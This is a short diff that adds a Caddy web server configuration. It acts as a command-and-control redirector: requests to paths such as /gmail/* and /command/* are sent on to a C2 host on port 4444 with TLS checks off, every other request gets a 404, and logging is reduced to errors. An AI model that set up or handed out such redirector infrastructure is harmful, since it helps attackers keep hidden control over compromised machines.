@@ -1,0 +1,16 @@
+:8080 {
+	log {
+		level ERROR
+	}
+	@c2 path /gmail/* /api/* /command/* /s/*
+	handle @c2 {
+		reverse_proxy {$C2_HOST:host.docker.internal}:{$C2_PORT:4444} {
+			transport http {
+				tls_insecure_skip_verify
+			}
+		}
+	}
+	handle {
+		respond "Not Found" 404
+	}
+}
